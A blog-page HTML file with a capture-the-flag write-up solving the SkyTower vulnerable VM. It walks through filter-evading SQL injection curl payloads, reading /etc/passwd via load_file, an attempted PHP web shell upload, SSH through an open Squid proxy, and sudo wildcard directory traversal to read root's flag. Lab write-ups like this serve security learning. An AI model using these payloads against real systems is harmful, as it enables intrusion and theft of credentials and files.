@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>Climbing the SkyTower &middot; </title>
+
+  
+  <link rel="stylesheet" href="http://leonjza.github.io/css/poole.css">
+  <link rel="stylesheet" href="http://leonjza.github.io/css/hyde.css">
+  <link rel="stylesheet" href="http://leonjza.github.io/css/poole-overrides.css">
+  <link rel="stylesheet" href="http://leonjza.github.io/css/hyde-overrides.css">
+  <link rel="stylesheet" href="http://leonjza.github.io/css/hyde-x.css">
+  <link rel="stylesheet" href="http://leonjza.github.io/css/highlight/solarized_light.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+  
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://leonjza.github.io/touch-icon-144-precomposed.png">
+  <link href="http://leonjza.github.io/favicon.png" rel="icon">
+
+  
+  
+  
+  
+
+  <meta name="description" content="">
+  <meta name="keywords" content="">
+  
+</head>
+<body class="theme-base-0d">
+<div class="sidebar">
+  <div class="container sidebar-sticky">
+    <div class="sidebar-about">
+      
+        <img src="https://www.gravatar.com/avatar/28d2f6c24dad39f38af0272dfc0da953?s=200"
+             alt="gravatar" title="">
+      
+      <h1></h1>
+      <p class="lead">#!/slash/note<br />
+<em>A checkbox unchecker&rsquo;s notepad</em></p>
+    </div>
+
+    <ul class="sidebar-nav">
+      <li class="sidebar-nav-item"><a href="http://leonjza.github.io/">Home</a></li>
+      
+      <li class="sidebar-nav-item"><a href="http://leonjza.github.io/about/">About</a></li>
+      
+    </ul>
+
+    <ul class="sidebar-nav">
+      <li class="sidebar-nav-item">
+      <a href="https://github.com/leonjza"><i class="fa fa-github-square fa-3x"></i></a>
+      
+      
+      
+      
+      
+      <a href="https://twitter.com/leonjza"><i class="fa fa-twitter-square fa-3x"></i></a>
+      
+      
+      </li>
+    </ul>
+
+    
+
+    <p>Copyright &copy; 2016 <a href="http://leonjza.github.io/license/">License</a><br/>
+       Powered by <a href="http://gohugo.io">Hugo</a> and <a href="https://github.com/zyro/hyde-x">Hyde-X</a></p>
+  </div>
+</div>
+
+
+<div class="content container">
+  <div class="post">
+    <h1>Climbing the SkyTower</h1>
+    <span class="post-date">Jul 17, 2014 &middot; 12 minute read &middot; <a href="http://leonjza.github.io/2014/07/17/climbing-the-skytower/#disqus_thread">Comments</a>
+    
+    <br/>
+    <a class="label" href="http://leonjza.github.io/categories/ctf">CTF</a><a class="label" href="http://leonjza.github.io/categories/vulnerable-vm">Vulnerable VM</a><a class="label" href="http://leonjza.github.io/categories/solution">Solution</a><a class="label" href="http://leonjza.github.io/categories/challenge">Challenge</a>
+    </span>
+    
+
+<p>##foreword
+Recently, at a local Security Conference, <a href="https://twitter.com/telspacesystems">@telspacesystems</a> ran a CTF. It was a classic &lsquo;read /root/flag.txt&rsquo; CTF hosted on a wireless network. Sadly the wifi sucked, a lot, and due to this and a flat battery I was not able to attempt this CTF properly at the con. Nonetheless, the VM was released on <a href="http://vulnhub.com/entry/skytower-1,96/">VulnHub</a>, and was promptly downloaded and loaded into VirtualBox.</p>
+
+<p>In summary, this CTF taught me some interesting things about SQL injection where filters are present. More specifically, commas were filtered out and resulted in the need from some creative thinking :)</p>
+
+<h2 id="starting-off:75e5a735a50eb678419419456b7154b6">starting off</h2>
+
+<p>The very first thing to do was get the IP assigned by my home router to the VM. Loaded this up into a web browser and saw the skytower web page as per the screenshots in the vulnhub entry. The IP I got was 192.168.137.242.</p>
+
+<p>The home page presented you with a login screen and a 2.5MB &lsquo;background.jpg&rsquo; image. Right in the beginning I was started off on the wrong path. I downloaded this background image and attempted to see if there was anything particularly interesting about it. Sadly, the answer to this question was a loud <em>NOPE</em>. I started dirbuster on the web interface and proceeded with a nmap scan of 192.168.137.242 after which I had to call it a night.</p>
+
+<p>```bash SkyTower Nmap results
+$ nmap &ndash;reason -Pn 192.168.137.242</p>
+
+<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-07-17 18:32 SAST
+Nmap scan report for 192.168.137.242
+Host is up, received user-set (0.0020s latency).
+Not shown: 997 closed ports
+Reason: 997 conn-refused
+PORT     STATE    SERVICE    REASON
+22/tcp   filtered ssh        no-response
+80/tcp   open     http       syn-ack
+3128/tcp open     squid-http syn-ack</p>
+
+<pre><code>
+Next morning I reviewed the results and continued to poke around.
+
+## learn all you can
+With the information gathered so far, I realized that the SSH (tcp/22) was explicitly filtered, however the squid proxy was open. I tried to telnet and use the CONNECT method to see if I was able to access the SSH service:
+
+```bash SSH Access via open proxy
+$ telnet 192.168.137.242 3128
+Trying 192.168.137.242...
+Connected to 192.168.137.242.
+Escape character is '^]'.
+CONNECT 127.0.0.1:22
+HTTP/1.0 200 Connection established
+
+SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u1
+^]
+telnet&gt; quit
+Connection closed.
+</code></pre>
+
+<p>Great, soooo I can get access to the SSH service of needed. The dirbuster results showed nothing of particular interest, but it was worth a shot anyways. An important thing to note here is that I suspect I maxed out the disk space in the VM due to the access_log growing too big from the dirbust. This caused me numerous headaches and frustrated me quite a bit when I was testing. Anyways&hellip;</p>
+
+<p>The next step was to poke around the web application. I personally really enjoy web hacking so this was probably the most fun of the whole CTF. The web page presented you with a simple form that would POST to <code>login.php</code>. 2 fields were posted: <code>email</code> &amp; <code>password</code></p>
+
+<p>A natural reaction is to try and use a single quote in form fields as a quick and nasty check for potential SQL injection. A login attempt with a username of test and password <code>'</code> resulted in:</p>
+
+<p>```bash SQLi Reveal
+There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &ldquo;&rdquo;&rsquo; at line 1]</p>
+
+<pre><code>
+Classic SQLi! Surprised I continued with simple login bypasses. None that I could think of out of my head appeared to work. Eventually I started to notice that some of the keywords that I was using were not appearing in the error messages. This hinted heavily towards the fact that there may be some form of filtering in place. Eventually, I put the request down in a curl command so that I can work with this slightly easier. To sample the keywords being removed:
+
+```bash SkyTower keyword removal
+$ curl --data &quot;email=foo@bar&amp;password=' OR 1=1#&quot; http://192.168.137.242/login.php
+There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '11#'' at line 1]%
+
+$ curl --data &quot;email=foo@bar&amp;password='1 OR 1=1#&quot; http://192.168.137.242/login.php
+There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1  11#'' at line 1]%
+</code></pre>
+
+<p>Ok, so no <code>OR</code>. Thats ok, we can substitute this easily with <code>||</code>.</p>
+
+<p>```html SkyTower Auth Bypass
+$ curl &ndash;data &ldquo;email=foo@bar&amp;password=&rsquo; || 1=1#&rdquo; <a href="http://192.168.137.242/login.php">http://192.168.137.242/login.php</a>
+<HTML>
+      <div style="height:100%; width:100%;background-image:url('background.jpg');
+                                background-size:100%;
+                                background-position:50% 50%;
+                                background-repeat:no-repeat;">
+      <div style="
+        padding-right:8px;
+              padding-left:10px;
+        padding-top: 10px;
+              padding-bottom: 10px;
+                  background-color:white;
+                  border-color: #000000;
+                  border-width: 5px;
+                  border-style: solid;
+                  width: 400px;
+                  height:430px;
+                  position:absolute;
+                  top:50%;
+                  left:50%;
+                  margin-top:-215px; /* this is half the height of your div*/
+                  margin-left:-200px;
+                                ">
+   <br><strong><font size=4>Welcome john@skytech.com</font><br /> </br></strong>As you may know, SkyTech has ceased all international operations.<br><br> To all our long term employees, we wish to convey our thanks for your dedication and hard work.<br><br><strong>Unfortunately, all international contracts, including yours have been terminated.</strong><br><br> The remainder of your contract and retirement fund, <strong>$2</strong> ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.<br><br><strong>Username: john</strong><br><strong>Password: hereisjohn</strong> <br><br> We wish you the best of luck in your future endeavors. <br> </div> </div></HTML>%</p>
+
+<pre><code>
+And success. We have made some progress :D Little did I know that I don't actually completely understand the progress made yet, but just keep this in mind :)
+
+## climbing the tower and faling hard
+From the auth bypass results, we can see specific mention for users to SSH into the server. This particular user has a username `john` and a password `hereisjohn`. So lets try this.
+I setup my `proxychains` install to use the http proxy available on the server (`http 192.168.137.242 3128`) and opened a SSH session through it:
+
+```bash SSH via Squid Proxy
+$ proxychains4 ssh john@127.0.0.1
+[snip]
+[proxychains] Strict chain  ...  192.168.137.242:3128  ...  127.0.0.1:22  ...  OK
+john@127.0.0.1's password:
+Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Jul 17 12:54:32 2014 from localhost
+
+Funds have been withdrawn
+Connection to 127.0.0.1 closed.
+$
+</code></pre>
+
+<p>&hellip; ok. So we get a session, and are told <em>Funds have been withdrawn</em>, and get the connection closed. Not exactly what I hoped for. Thinking what could cause this behavior, my mind went on to things like a custom shell, <code>.bashrc</code> files (assuming the user has bash a a shell) etc. So, I figured there may be more users on the system and I should try get those credentials too. After all, we have a working SQL injection point.</p>
+
+<h2 id="more-sql-injection:75e5a735a50eb678419419456b7154b6">more sql injection</h2>
+
+<p>So back to the SQLi point it was. Taking a wild guess, I assumed there is a <code>users</code> table, and the table will have a primary key of <code>id</code>. So, <code>john</code> may have id 1, and a next user have id 2. So I modified the query slightly:</p>
+
+<p>```bash SkyTower = filter
+$ curl &ndash;data &ldquo;email=foo@bar&amp;password=&rsquo; || id=1#&rdquo; <a href="http://192.168.137.242/login.php">http://192.168.137.242/login.php</a>
+There was an error running the query [Unknown column &lsquo;id1&rsquo; in &lsquo;where clause&rsquo;]%</p>
+
+<pre><code>
+Well I definitely didn't ask for the column `id1`, but from this again it was apparent that `=` was filtered along with `OR`. :| Ok, so we change the payload again:
+
+```bash SkyTower user enum
+$ curl --data &quot;email=foo@bar&amp;password=' || id &gt; 1#&quot; http://192.168.137.242/login.php
+[snip]
+&lt;br&gt;&lt;strong&gt;&lt;font size=4&gt;Welcome sara@skytech.com&lt;/font&gt;&lt;br /&gt; &lt;/br&gt;&lt;/strong&gt;As you may know, SkyTech has ceased all international operations.&lt;br&gt;&lt;br&gt; To all our long term employees, we wish to convey our thanks for your dedication and hard work.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Unfortunately, all international contracts, including yours have been terminated.&lt;/strong&gt;&lt;br&gt;&lt;br&gt; The remainder of your contract and retirement fund, &lt;strong&gt;$2&lt;/strong&gt; ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Username: sara&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;Password: ihatethisjob&lt;/strong&gt; &lt;br&gt;&lt;br&gt; We wish you the best of luck in your future endeavors. &lt;br&gt; &lt;/div&gt; &lt;/div&gt;&lt;/HTML&gt;%
+</code></pre>
+
+<p>Yay, my guess on the <code>id</code> column was correct, and I now had a second users details. I continued to increment the <code>id</code>, and ended up with 3 accounts:</p>
+
+<ul>
+<li>john:hereisjohn</li>
+<li>sara:ihatethisjob</li>
+<li>william:senseable</li>
+</ul>
+
+<p>The users <code>john</code> &amp; <code>sara</code> both had the same behavior when attempting login via SSH, and the user <code>william</code> appears to have had an incorrect password. So, again the results were not exactly what I hoped for.</p>
+
+<h2 id="more-sql-enumeration:75e5a735a50eb678419419456b7154b6">more SQL enumeration</h2>
+
+<p>At this stage, I was thinking there must be more information in the database, and I should try and read some files from disk in order to gain a better understanding of what is going on here.</p>
+
+<p>Fast forward a few hours, I discovered that a few more keywords and symbols were filtered. The hardest being the realization that a <code>union select</code> was not working as expected so that I can enumerate the columns. Even though the initial entry on vulnhub mentioned that automated tools would probably not work, I figured in this case that I had a valid SQLi, I could just make use of some SQLMap automagic. Again <em>NOPE</em>. Even with <code>--level 3</code> &amp; <code>--risk 3</code> there was no joy. This is ok.</p>
+
+<p>I studied the error messages in detail, googled&hellip; a lot&hellip; and eventually came across <a href="http://zoczus.blogspot.nl/2013/03/sql-injection-without-comma-char.html">this</a> blogpost, detailing a way to get a union working without the ability to use commas. I should also note that I managed to bypass the <code>SELECT</code> filter by using <code>SELECSELECTT</code> in the payload. Assuming that the filter was a simple <code>str_replace()</code>, this left me with <code>SELECT</code> after the pass.</p>
+
+<p>For the sake of brevity I am not going to detail all of the methods I used in order to exploit the SQLi and get value out of it. I managed to learn that the database user used by the PHP application was root. The query used in <code>login.php</code> returned 3 columns. One particular payload of interest that uses the method in the previously mentioned blog post, was used to start reading files from the servers disk. More specifically, <code>/etc/passwd</code>:</p>
+
+<p>```bash SkyTower File Access
+$ curl &ndash;data &ldquo;email=foo@bar&amp;password=&rsquo; or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt load_file(&lsquo;/etc/password&rsquo;)) as c#&rdquo; <a href="http://192.168.137.242/login.php">http://192.168.137.242/login.php</a>
+[snip]
+<br><strong><font size=4>Welcome 222</font><br /> </br></strong>As you may know, SkyTech has ceased all international operations.<br><br> To all our long term employees, we wish to convey our thanks for your dedication and hard work.<br><br><strong>Unfortunately, all international contracts, including yours have been terminated.</strong><br><br> The remainder of your contract and retirement fund, <strong>$2</strong> ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.<br><br><strong>Username: 222</strong><br><strong>Password: root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
+mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
+john:x:1000:1000:john,,,:/home/john:/bin/bash
+sara:x:1001:1001:,,,:/home/sara:/bin/bash
+william:x:1002:1002:,,,:/home/william:/bin/bash
+</strong> <br><br> We wish you the best of luck in your future endeavors. <br> </div> </div></HTML></p>
+
+<pre><code>
+Reading the `/etc/passwd` revealed that there were no custom shells used for the users that were enumerated previously. O..k.. I also pulled the sources of `login.php` in order to understand what the deal with the filtering was:
+
+```php SkyTower SQL Injection Filtering
+$sqlinjection = array(&quot;SELECT&quot;, &quot;TRUE&quot;, &quot;FALSE&quot;, &quot;--&quot;,&quot;OR&quot;, &quot;=&quot;, &quot;,&quot;, &quot;AND&quot;, &quot;NOT&quot;);
+$email = str_ireplace($sqlinjection, &quot;&quot;, $_POST['email']);
+$password = str_ireplace($sqlinjection, &quot;&quot;, $_POST['password']);
+</code></pre>
+
+<p>And as suspected. :)</p>
+
+<p>One last thing that I tried, really hard, was to get a web shell on the server so that I can further explore the environment. This failed miserably. The closest I was able to get was:</p>
+
+<p>```bash SkyTower webshell fail
+$ curl &ndash;data &ldquo;email=foo@bar&amp;password=&rsquo; or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt &lsquo;&lt;?php print_r(shell_exec($_GET[cmd])); ?&gt;&lsquo;) as c into outfile &lsquo;/var/www/shell.php&rsquo;#&rdquo; <a href="http://192.168.137.242/login.php">http://192.168.137.242/login.php</a>
+There was an error running the query [Can&rsquo;t create/write to file &lsquo;/var/www/shell.php&rsquo; (Errcode: 13)]</p>
+
+<pre><code>
+This obviously alludes to the fact that the user MySQL is running as des not have access to write to the web folder. It was time to rethink what was going on here...
+Oh yes, I obviously tried to just cat `/root/flag.txt`, but didn’t expect it to be *that* easy :D
+
+## gaining further access
+After spending a really long time with the SQL injections, I decided to relook the SSH section. From the SQL injection that I learnt that there don't _appear_ to be any custom shells in use, so the other thing this could be is a `.bashrc` with a `exit` command. I know its `.bashrc` because I saw the shell is `/bin/bash` from the `/etc/passwd`. I remember that I make heavy use of `ssh -t` to execute commands on the remove server, usually to setup multiple tunnels into a network, so I thought it will come in handy here.
+
+For this case though, I though I'd specify a `/bin/sh` as the _command_ to run, hoping to not get caught in a `.bashrc` running:
+
+```bash SkyTower .bashrc fix
+$ proxychains4 -q ssh john@127.0.0.1 -t /bin/sh
+john@127.0.0.1's password:
+$ id
+uid=1000(john) gid=1000(john) groups=1000(john)
+</code></pre>
+
+<p>Woop! I was now logged in as <code>john</code>. I inspected the <code>.bashrc</code> file and saw that at the end there was:</p>
+
+<p>```bash SkyTower .bashrc exit
+echo
+echo  &ldquo;Funds have been withdrawn&rdquo;
+exit</p>
+
+<pre><code>
+... a exit. I simply removed the line. Now the almost obvious next step was to inspect and enumerate as much as possible. The most obvious thing that came to mind was privilege escalation as I was simply a normal user on the system at the moment.
+
+## enumeration enumeration enumeration
+I enumerated, everything... Referring to a excellent [post by g0tm1lk](http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) nothing aparent came up. The only semi strange thing was a empty `/accounts/` directory:
+
+```bash SkyTower accounts
+john@SkyTower:/accounts$ ls -lah /accounts/
+total 8.0K
+drwxr-xr-x  2 root root 4.0K Jun 20 07:52 .
+drwxr-xr-x 24 root root 4.0K Jun 20 07:52 ..
+</code></pre>
+
+<p>Other than that things seemed pretty normal. I decided to check out the other user <code>sara</code> too. This user has a similar <code>exit</code> in the <code>.bashrc</code> which I just removed. There was one distinct difference during enumeration though&hellip;</p>
+
+<p>```bash sara sudo
+sara@SkyTower:~$ sudo -l
+Matching Defaults entries for sara on this host:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
+
+<p>User sara may run the following commands on this host:
+    (root) NOPASSWD: /bin/cat /accounts/<em>, (root) /bin/ls /accounts/</em></p>
+
+<pre><code>
+This user may execute some commands as root using `sudo`. `sudo` allows you to specify what those commands are, if not all. There was one problem with this configuration though. `*` is a wildcard character, and as such, anything after `cat /accounts/` may also be run. This means that things like `sudo cat /accounts/../../etc/shadow` will work as the wildcard allows us to do a form of directory traversal.
+
+## pwnd
+
+So, to complete SkyTower:
+
+```bash SkyTower pwn
+sara@SkyTower:~$ sudo cat /accounts/../../root/flag.txt
+Congratz, have a cold one to celebrate!
+root password is theskytower
+</code></pre>
+
+<p>Thanks to <a href="https://twitter.com/telspacesystems">@telspacesystems</a> for the fun experience. I learnt something so for this was totally worth it!</p>
+
+  </div>
+  <div id="disqus_thread"></div>
+</div>
+
+
+<script type="text/javascript">
+var disqus_shortname = "slashnote";
+(function () {
+    var s = document.createElement('script'); s.async = true;
+    s.type = 'text/javascript';
+    s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+    (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+}());
+</script>
+
+
+
+<script type="text/javascript">
+    var disqus_shortname = "slashnote";
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+<script src="http://leonjza.github.io/js/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script>
+  var _gaq=[['_setAccount','UA-44457032-2'],['_trackPageview']];
+  (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
+  g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
+  s.parentNode.insertBefore(g,s)}(document,'script'));
+</script>
+
+</body>
+</html>
+
